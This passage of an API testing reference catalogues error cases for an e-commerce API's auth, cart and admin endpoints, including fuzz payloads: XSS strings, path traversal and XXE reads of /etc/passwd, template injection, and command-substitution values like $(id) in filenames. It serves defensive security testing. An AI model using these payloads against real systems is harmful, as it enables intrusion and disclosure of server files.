- **Status Code**: 200 (But old client fails)
- **Affected Endpoints**:
  - Modified endpoints

### Error Example:
```
Version 1 parser expects: {_id, title, price}
Version 2 returns: {_id, title, price, category}
If parser validates strict schema, fails
```

---

### Error: Response Field Order Changed
- **Description**: Fields returned in different order
- **Why It Occurs**: Query result ordering changed
- **Status Code**: 200 (Order changed)
- **Affected Endpoints**:
  - List endpoints

### Error Example:
```
Version 1 always returns fields as: [_id, title, price]
Version 2 returns: [price, title, _id]
Positional parsers get wrong data
```

---

### Error: Pagination Format Changed
- **Description**: Pagination response structure changed
- **Why It Occurs**: Pagination implementation overhaul
- **Status Code**: 200 (Structure changed)
- **Affected Endpoints**:
  - List endpoints (if implemented)

### Error Example:
```
Version 1: {items: [], totalCount: 10, page: 1}
Version 2: {data: [], total: 10, currentPage: 1}
Old pagination logic breaks
```

---

### Error: Error Response Format Changed
- **Description**: Error response structure changed
- **Why It Occurs**: Error handling refactored
- **Status Code**: 422/400/500 (Format changed)
- **Affected Endpoints**:
  - All error responses

### Error Example:
```
Version 1: {message: "Email required"}
Version 2: {errors: [{msg: "Email required", param: "email"}]}
Old error handlers break
```

---

### Error: Timestamp Format Changed
- **Description**: Date/time fields format changed
- **Why It Occurs**: Timezone or format preference change
- **Status Code**: 200 (Format changed)
- **Affected Endpoints**:
  - Endpoints returning dates

### Error Example:
```
Version 1: createdAt: "2024-01-01T00:00:00Z"
Version 2: createdAt: "01/01/2024"
Old clients can't parse new format
```

---

### Error: Number Format Changed
- **Description**: Numbers returned in different format
- **Why It Occurs**: Precision or representation change
- **Status Code**: 200 (Format changed)
- **Affected Endpoints**:
  - Any numeric field

### Error Example:
```
Version 1: price: 99.99 (number)
Version 2: price: "99.99" (string)
Old clients expecting number get string
```

---

---

# FUZZ TESTING ERRORS

## 1. RANDOM_STRING

### Error: Very Long String Input
- **Description**: Extremely long string causes buffer overflow or memory issues
- **Payload Example**: `email: "aaaa...aaaa"` (10MB string)
- **Why It Occurs**: No input length limits
- **Status Code**: 500 (Memory error) or 413 (Payload too large)
- **Affected Endpoints**:
  - `POST /login` - email/password
  - `POST /signup` - email/password
  - `POST /admin/add-item` - title/description

### Error Example:
```json
{
  "message": "413 Payload Too Large"
}
```

---

### Error: Null Bytes in String
- **Description**: String containing null bytes causing truncation
- **Payload Example**: `email: "user\x00@example.com"`
- **Why It Occurs**: Null byte handling
- **Status Code**: 422 or 400
- **Affected Endpoints**:
  - Any text field

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Invalid input",
      "param": "email"
    }
  ]
}
```

---

### Error: Special Unicode Characters
- **Description**: Unicode characters causing encoding issues
- **Payload Example**: `title: "عنوان الكتاب 中文 🚀"`
- **Why It Occurs**: Character encoding mismatch
- **Status Code**: 201 (If stored) or 422
- **Affected Endpoints**:
  - `POST /admin/add-item`
  - `PUT /admin/edit-item/{id}`

### Error Example:
```json
{
  "_id": "507f1f77bcf86cd799439011",
  "title": "عنوان الكتاب 中文 🚀",
  "price": 99.99
}
```

---

### Error: Control Characters in String
- **Description**: Control characters (TAB, newline, etc.) causing issues
- **Payload Example**: `title: "Book\t\n\rTitle"`
- **Why It Occurs**: No control character filtering
- **Status Code**: 201 or 422
- **Affected Endpoints**:
  - Any text field

### Error Example:
```json
{
  "title": "Book\t\n\rTitle"
}
```

---

### Error: Whitespace Only Input
- **Description**: String containing only whitespace
- **Payload Example**: `title: "   "` or `description: "\t\t\t"`
- **Why It Occurs**: Validation doesn't trim whitespace
- **Status Code**: 201 (If vulnerable) or 422
- **Affected Endpoints**:
  - `POST /admin/add-item`
  - `PUT /admin/edit-item/{id}`

### Error Example:
```json
{
  "title": "   ",
  "description": "\t\t\t"
}
```

---

### Error: Mixed Encoding in String
- **Description**: String with mixed character encodings
- **Payload Example**: `email: "test@™example.com"` (mixed UTF-8/Latin1)
- **Why It Occurs**: Encoding detection failure
- **Status Code**: 422 or 200
- **Affected Endpoints**:
  - Email fields

---

### Error: Single and Double Quote Injection
- **Description**: Single/double quotes in string
- **Payload Example**: `title: "O'Brien's \"Best\" Book"`
- **Why It Occurs**: Quote handling in queries
- **Status Code**: 201 or error
- **Affected Endpoints**:
  - Any string field

### Error Example:
```json
{
  "title": "O'Brien's \"Best\" Book"
}
```

---

## 2. UNICODE_INPUT

### Error: Emoji in Text Fields
- **Description**: Emoji characters causing issues
- **Payload Example**: `title: "🎉 Amazing Product 🎉"`
- **Why It Occurs**: Emoji support gaps
- **Status Code**: 201 (If supported) or 422
- **Affected Endpoints**:
  - `POST /admin/add-item`
  - Text fields

### Error Example:
```json
{
  "title": "🎉 Amazing Product 🎉"
}
```

---

### Error: Combining Characters
- **Description**: Unicode combining marks causing length issues
- **Payload Example**: `email: "u\u0308ser@example.com"` (ü as u + combining diaeresis)
- **Why It Occurs**: String length miscalculation
- **Status Code**: 422 or validation confusion
- **Affected Endpoints**:
  - Email/text fields

---

### Error: Right-to-Left Characters
- **Description**: RTL characters like Arabic causing display/parsing issues
- **Payload Example**: `title: "מוצר טוב" (Hebrew)` or `title: "منتج جيد" (Arabic)`
- **Why It Occurs**: Directionality issues
- **Status Code**: 201 (If stored)
- **Affected Endpoints**:
  - `POST /admin/add-item`

---

### Error: Zero-Width Characters
- **Description**: Zero-width spaces/joiners/non-joiners
- **Payload Example**: `email: "user\u200Bexample@example.com"` (zero-width space)
- **Why It Occurs**: Hidden character injection
- **Status Code**: 422 or 201
- **Affected Endpoints**:
  - Email field

---

### Error: Surrogate Pairs
- **Description**: UTF-16 surrogate pairs causing parsing issues
- **Payload Example**: `title: "High surrogate \uD800\uDC00"`
- **Why It Occurs**: Surrogate pair handling
- **Status Code**: 500 or 422
- **Affected Endpoints**:
  - Text fields

---

### Error: Normalized vs Non-Normalized Unicode
- **Description**: Different Unicode normalizations of same character
- **Payload Example**: `email: "café@example.com"` vs `email: "café@example.com"` (different normalization)
- **Why It Occurs**: Unicode normalization not enforced
- **Status Code**: 200 (Different users can have same name)
- **Affected Endpoints**:
  - Email field (security issue)

---

### Error: Invalid Unicode Sequences
- **Description**: Invalid UTF-8 byte sequences
- **Payload Example**: `\xFF\xFE` (invalid UTF-8)
- **Why It Occurs**: Encoding validation gap
- **Status Code**: 400 or 500
- **Affected Endpoints**:
  - Any text field

---

## 3. LONG_INPUT

### Error: Very Long Email
- **Description**: Email length exceeds reasonable limits
- **Payload Example**: `email: "a@" + "b.c".repeat(1000) + ".com"` (very long domain)
- **Why It Occurs**: No email length validation
- **Status Code**: 422 (If validated) or 201
- **Affected Endpoints**:
  - `POST /login`
  - `POST /signup`
  - `POST /reset`

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Email too long",
      "param": "email"
    }
  ]
}
```

---

### Error: Very Long Password
- **Description**: Password length exceeds bcrypt limit (72 characters)
- **Payload Example**: `password: "a".repeat(100)`
- **Why It Occurs**: bcrypt truncates at 72 characters
- **Status Code**: 201 (User created but password truncated)
- **Affected Endpoints**:
  - `POST /signup`
  - `POST /reset/{token}`

### Error Example (Security Issue):
```
Original password: "a".repeat(100)
bcrypt processes only first 72 chars: "a".repeat(72)
Shorter password still logs user in
```

---

### Error: Very Long Title
- **Description**: Product title exceeds maxLength
- **Payload Example**: `title: "Product" + "x".repeat(1000)`
- **Why It Occurs**: No length validation
- **Status Code**: 422 (If validated) or 201
- **Affected Endpoints**:
  - `POST /admin/add-item`
  - `PUT /admin/edit-item/{id}`

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Title too long",
      "param": "title"
    }
  ]
}
```

---

### Error: Very Long Description
- **Description**: Description exceeds maxLength (100 chars in schema)
- **Payload Example**: `description: "x".repeat(10000)`
- **Why It Occurs**: No length enforced
- **Status Code**: 422 or 201
- **Affected Endpoints**:
  - `POST /admin/add-item`
  - `PUT /admin/edit-item/{id}`

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Description must be between 5 and 100 characters",
      "param": "description"
    }
  ]
}
```

---

### Error: Very Long Object ID
- **Description**: ID parameter with excessive length
- **Payload Example**: `GET /items/aaaaaa...aaaa` (1MB string as ID)
- **Why It Occurs**: No ID length validation
- **Status Code**: 400 or 404
- **Affected Endpoints**:
  - `GET /items/{id}`
  - `POST /add-to-cart/{id}`
  - Any endpoint with {id}

### Error Example:
```json
{
  "message": "Invalid ID format"
}
```

---

### Error: Very Long JWT Token
- **Description**: Authorization header with extremely long token
- **Payload Example**: `Authorization: Bearer aaa...aaa` (10MB token string)
- **Why It Occurs**: No token length limit
- **Status Code**: 401 or 413
- **Affected Endpoints**:
  - All protected endpoints

### Error Example:
```json
{
  "message": "Could not process your authentication status"
}
```

---

### Error: Large File Upload
- **Description**: Image file exceeds server limits
- **Payload Example**: Image file 500MB
- **Why It Occurs**: No upload size limit
- **Status Code**: 413 (Payload Too Large) or timeout
- **Affected Endpoints**:
  - `POST /admin/add-item`
  - `PUT /admin/edit-item/{id}`

### Error Example:
```html
413 Payload Too Large
```

---

### Error: Very Long Reset Token
- **Description**: Reset token parameter with excessive length
- **Payload Example**: `POST /reset/aaa...aaa` (1MB random string)
- **Why It Occurs**: No token length validation
- **Status Code**: 400 or 404
- **Affected Endpoints**:
  - `POST /reset/{token}`

---

## 4. XSS_FUZZ

### Error: Script Tag XSS
- **Description**: <script> tags in input
- **Payload Example**: `title: "<script>alert('XSS')</script>"`
- **Why It Occurs**: No HTML sanitization
- **Status Code**: 201 (If stored and vulnerable)
- **Affected Endpoints**:
  - `POST /admin/add-item`
  - `PUT /admin/edit-item/{id}`

### Error Example:
```json
{
  "_id": "507f1f77bcf86cd799439011",
  "title": "<script>alert('XSS')</script>"
}
```

---

### Error: Event Handler XSS
- **Description**: Event handlers in HTML attributes
- **Payload Example**: `title: "<img src=x onerror=alert('XSS')>"`
- **Why It Occurs**: No HTML escaping
- **Status Code**: 201 (If stored)
- **Affected Endpoints**:
  - `POST /admin/add-item`
  - `PUT /admin/edit-item/{id}`

---

### Error: SVG-based XSS
- **Description**: SVG with embedded script
- **Payload Example**: `image: SVG file with <script>alert('XSS')</script>`
- **Why It Occurs**: SVG file type not properly restricted
- **Status Code**: 201 (If image upload accepts SVG)
- **Affected Endpoints**:
  - `POST /admin/add-item`
  - `PUT /admin/edit-item/{id}`

---

### Error: Data URI XSS
- **Description**: Data URI with javascript protocol
- **Payload Example**: `image: "data:text/html,<script>alert('XSS')</script>"`
- **Why It Occurs**: Data URI scheme not blocked
- **Status Code**: 201
- **Affected Endpoints**:
  - Image upload fields

---

### Error: Base64 Encoded XSS
- **Description**: XSS payload encoded in base64
- **Payload Example**: `title: "PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KCdYU1MnKT4="` (base64)
- **Why It Occurs**: Encoding bypass not detected
- **Status Code**: 201
- **Affected Endpoints**:
  - `POST /admin/add-item`

### Error Example (Decoded):
```json
{
  "title": "<img src=x onerror=alert('XSS')>"
}
```

---

### Error: Protocol-based XSS
- **Description**: JavaScript protocol in links
- **Payload Example**: `description: "javascript:alert('XSS')"`
- **Why It Occurs**: Protocol not validated
- **Status Code**: 201
- **Affected Endpoints**:
  - `POST /admin/add-item`

---

### Error: CSS Expression XSS
- **Description**: Expression injection in CSS
- **Payload Example**: `title: "style='background: expression(alert(\"XSS\"))'"`
- **Why It Occurs**: CSS expressions evaluated (old IE)
- **Status Code**: 201
- **Affected Endpoints**:
  - Any style field

---

### Error: HTML Entity Bypass
- **Description**: HTML encoded but not fully
- **Payload Example**: `title: "&lt;script&gt;alert('XSS')&lt;/script&gt;"` (stored, decoded on display)
- **Why It Occurs**: Mixed encoding
- **Status Code**: 201
- **Affected Endpoints**:
  - `POST /admin/add-item`

---

## 5. PATH_TRAVERSAL

### Error: Dot Dot Slash Traversal
- **Description**: Path traversal using ../ sequence
- **Payload Example**: `imageName: "../../etc/passwd"`
- **Why It Occurs**: No path normalization
- **Status Code**: 200 or 400
- **Affected Endpoints**:
  - Image storage paths

### Error Example (If Vulnerable):
```
File access: /var/www/../../etc/passwd -> /etc/passwd
```

---

### Error: Multiple Traversal Attempts
- **Description**: Multiple ../ sequences
- **Payload Example**: `imageName: "../../../../../../../../etc/passwd"`
- **Why It Occurs**: Incomplete path filtering
- **Status Code**: 200 or 400
- **Affected Endpoints**:
  - File access endpoints

---

### Error: URL Encoding Bypass
- **Description**: Path traversal with URL encoding
- **Payload Example**: `imageName: "..%2F..%2Fetc%2Fpasswd"`
- **Why It Occurs**: Encoding not decoded before validation
- **Status Code**: 200 or 400
- **Affected Endpoints**:
  - Any path parameter

---

### Error: Double Encoding
- **Description**: Double-encoded traversal
- **Payload Example**: `imageName: "..%252F..%252Fetc%252Fpasswd"` (%25 = %)
- **Why It Occurs**: Double decoding issues
- **Status Code**: 200 or error
- **Affected Endpoints**:
  - File handling

---

### Error: Backslash Traversal
- **Description**: Windows path traversal with backslash
- **Payload Example**: `imageName: "..\\..\\windows\\system32"`
- **Why It Occurs**: Windows path separator not handled
- **Status Code**: 200 or 400
- **Affected Endpoints**:
  - File paths (if on Windows)

---

### Error: Null Byte Traversal
- **Description**: Path traversal with null byte injection
- **Payload Example**: `imageName: "..%00/etc/passwd"`
- **Why It Occurs**: Null byte truncation
- **Status Code**: 200 or error
- **Affected Endpoints**:
  - File operations

---

### Error: Unicode Normalization Bypass
- **Description**: Unicode characters representing traversal
- **Payload Example**: `imageName: "..\\` (with Unicode variant)
- **Why It Occurs**: Normalization bypass
- **Status Code**: 200 or error
- **Affected Endpoints**:
  - Path handling

---

### Error: Absolute Path Usage
- **Description**: Absolute path instead of relative
- **Payload Example**: `imageName: "/etc/passwd"` or `imageName: "C:\\windows\\system32"`
- **Why It Occurs**: Absolute paths allowed
- **Status Code**: 200
- **Affected Endpoints**:
  - File access

---

## 6. PAYLOAD_INJECTION

### Error: XML Entity Injection
- **Description**: XXE (XML External Entity) payload
- **Payload Example**: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`
- **Why It Occurs**: XML parser processes external entities (unlikely in JSON API)
- **Status Code**: 500 or 200
- **Affected Endpoints**:
  - Any endpoint parsing XML (if implemented)

---

### Error: YAML Injection
- **Description**: YAML deserialization injection
- **Payload Example**: YAML with !python/object tags
- **Why It Occurs**: Unsafe YAML parsing
- **Status Code**: 500 or 200
- **Affected Endpoints**:
  - Any YAML-parsing endpoint

---

### Error: Regular Expression Denial of Service (ReDoS)
- **Description**: Regex causing exponential backtracking
- **Payload Example**: `email: "aaaaaaaaaaaaaaaaaaaaaaaab@test.com"` (with ReDoS regex)
- **Why It Occurs**: Inefficient regex pattern
- **Status Code**: 500 (Timeout) or slow response
- **Affected Endpoints**:
  - Email/text validation fields

### Error Example:
```json
{
  "message": "Request timeout"
}
```

---

### Error: Template Injection
- **Description**: Template syntax injected
- **Payload Example**: `title: "{{ 7 * 7 }}"` or `<%= 7 * 7 %>`
- **Why It Occurs**: String used in template without sanitization
- **Status Code**: 201 or 200
- **Affected Endpoints**:
  - `POST /admin/add-item`

### Error Example (If Vulnerable):
```json
{
  "title": "49", // Template evaluated
  "price": 99.99
}
```

---

### Error: Server-Side Template Injection (SSTI)
- **Description**: Template code in user input executed
- **Payload Example**: `title: "{{constructor.prototype.isPrototypeOf({})}}"`
- **Why It Occurs**: Template engine evaluates user input
- **Status Code**: 200 or 500
- **Affected Endpoints**:
  - Any template rendering fields

---

### Error: Expression Language Injection
- **Description**: EL/SpEL injection (Java/Spring)
- **Payload Example**: `${7*7}` or `#{7*7}`
- **Why It Occurs**: Expression evaluation without sanitization
- **Status Code**: 201 or 200
- **Affected Endpoints**:
  - Any evaluation field

---

### Error: LDAP Injection
- **Description**: LDAP query injection
- **Payload Example**: `email: "*)(|(mail=*"` (LDAP filter)
- **Why It Occurs**: Unsanitized LDAP queries (not applicable here but included for completeness)
- **Status Code**: 422 or 200
- **Affected Endpoints**:
  - LDAP query endpoints (none in this API)

---

### Error: OS Command via Backticks
- **Description**: OS commands in backticks
- **Payload Example**: `description: "Cost: `cal`"` or `` `whoami` ``
- **Why It Occurs**: String interpolation evaluating backticks
- **Status Code**: 201 or 500
- **Affected Endpoints**:
  - `POST /admin/add-item`

---

### Error: Process Substitution
- **Description**: Process substitution syntax
- **Payload Example**: `filename: "test-$(id)-file.jpg"`
- **Why It Occurs**: Command substitution in filename
- **Status Code**: 400 or 500
- **Affected Endpoints**:
  - File upload

---

### Error: Variable Expansion Injection
- **Description**: Environment variable injection
- **Payload Example**: `title: "Product ${HOME}"`
- **Why It Occurs**: Variable expansion in strings
- **Status Code**: 201
- **Affected Endpoints**:
  - `POST /admin/add-item`

### Error Example (If Vulnerable):
```json
{
  "title": "Product /home/user"
}
```

---

---

# HTTP STATUS CODE REFERENCE

| Code | Type | Common Causes |
|------|------|---------------|
| **200** | OK | Successful GET, PUT request |
| **201** | Created | Successful POST (resource created) |
| **204** | No Content | Successful DELETE |
| **400** | Bad Request | Malformed request, invalid input |
| **401** | Unauthorized | Missing/invalid auth token |
| **403** | Forbidden | Valid auth but insufficient permissions |
| **404** | Not Found | Resource doesn't exist |
| **405** | Method Not Allowed | Wrong HTTP method (GET on POST endpoint) |
| **409** | Conflict | Duplicate email/resource already exists |
| **413** | Payload Too Large | File/request too large |
| **415** | Unsupported Media Type | Wrong Content-Type |
| **422** | Unprocessable Entity | Validation error in request body |
| **500** | Internal Server Error | Unhandled exception on server |
| **503** | Service Unavailable | Database/service down |

---

# SUMMARY OF AFFECTED ENDPOINTS

## Authentication Endpoints
- `POST /login`
- `POST /signup`
- `POST /reset`
- `POST /reset/{token}`

## Shop Endpoints
- `GET /items`
- `GET /items/{id}`

## Cart Endpoints
- `GET /cart`
- `POST /add-to-cart/{id}`
- `DELETE /delete-from-cart/{id}`

## Order Endpoints
- `POST /create-order`
- `GET /orders`
- `GET /orders/{id}`

## Admin Endpoints
- `POST /admin/add-item`
- `GET /admin/items`
- `PUT /admin/edit-item/{id}`
- `DELETE /admin/delete-item/{id}`

---

# RECOMMENDED TESTING PRIORITIES

## Critical (Must Test)
1. **INVALID_AUTH** - Prevents unauthorized access
2. **SQL/NOSQL_INJECTION** - Data breach risk
3. **BOLA** - Unauthorized data access
4. **TOKEN_MANIPULATION** - Session hijacking

## High Priority
1. **MISSING_PARAMS** - Breaks API contract
2. **SCHEMA_VALIDATION** - Data integrity
3. **XSS_INJECTION** - Frontend attacks
4. **BRUTE_FORCE** - Account compromise

## Medium Priority
1. **COMMAND_INJECTION** - Server compromise
2. **EXCESSIVE_DATA_EXPOSURE** - Privacy
3. **SECURITY_MISCONFIGURATION** - Multiple risks
4. **PATH_TRAVERSAL** - File access

## Lower Priority (API-specific)
1. Pagination/Sorting (not implemented yet)
2. Advanced filtering (not implemented)
3. Some FUZZ test types (edge cases)

---

**Document Version**: 1.0  
**Last Updated**: February 28, 2026  
**API Version**: 1.0.0
